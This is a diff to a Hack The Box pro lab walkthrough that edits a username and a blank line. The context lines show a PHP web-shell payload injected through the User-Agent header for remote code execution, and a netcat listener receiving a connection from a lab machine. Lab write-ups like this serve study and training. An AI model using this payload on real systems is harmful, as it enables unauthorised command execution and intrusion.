@@ -16,7 +16,6 @@ To get RCE add this  to the user agent: `<?php system($_GET['cmd']);?>`
 
 ![[Pasted image 20260322084712.png]]
 
-
 The command is executed:
 
 ![[Pasted image 20260322084753.png]]
@@ -29,7 +28,7 @@ And get a connection:
 
 ```bash
 garffff@garffff:~/htb/prolabs/trusted$ sudo nc -lvp 9999
-[sudo] password for gareth:            
+[sudo] password for garffff:            
 Listening on 0.0.0.0 9999
 Connection received on 10.13.38.42 58634
 
